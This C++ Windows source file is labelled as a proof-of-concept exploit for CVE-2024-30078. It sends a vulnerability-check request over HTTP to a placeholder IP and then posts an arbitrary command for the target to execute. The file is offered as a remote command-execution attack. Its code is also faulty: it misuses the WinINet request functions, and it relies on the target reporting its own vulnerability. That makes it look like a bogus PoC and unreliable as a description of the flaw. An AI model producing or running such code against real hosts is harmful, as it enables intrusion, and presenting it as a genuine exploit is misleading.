#include <windows.h>
#include <iostream>
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void trigger_exploit(const std::string& ip, int port, const std::string& endpoint, const std::string& command) {
    HINTERNET hInternet = InternetOpen("CVE-2024-30078 PoC", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        return;
    }

    std::string url = "http://" + ip + ":" + std::to_string(port) + endpoint;
    HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    // 构造用于检测漏洞的载荷
    std::string payload = "{\"command\":\"check_vulnerability\",\"cve\":\"CVE-2024-30078\"}";
    std::string headers = "Content-Type: application/json\r\n";

    BOOL bRequest = HttpSendRequest(hConnect, headers.c_str(), headers.length(), (LPVOID)payload.c_str(), payload.length());
    if (!bRequest) {
        std::cerr << "HttpSendRequest failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // 检查响应
    char buffer[1024];
    DWORD bytesRead;
    std::string response;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead != 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    if (response.find("\"vulnerable\":true") != std::string::npos) {
        std::cout << "Vulnerability detected on " << ip << ":" << port << std::endl;

        // 构造执行命令的载荷
        payload = "{\"command\":\"" + command + "\"}";

        bRequest = HttpSendRequest(hConnect, headers.c_str(), headers.length(), (LPVOID)payload.c_str(), payload.length());
        if (bRequest) {
            std::cout << "Command executed on " << ip << ":" << port << std::endl;
        } else {
            std::cerr << "Failed to execute command: " << GetLastError() << std::endl;
        }
    } else {
        std::cout << "No vulnerability detected on " << ip << ":" << port << std::endl;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {
    std::string ip = "192.168.1.1";  // 替换为实际IP地址
    int port = 80;  // 替换为实际端口
    std::string endpoint = "/check";  // 替换为实际端点地址
    std::string command = "pwd";  // 替换为实际要执行的命令

    trigger_exploit(ip, port, endpoint, command);
    return 0;
}
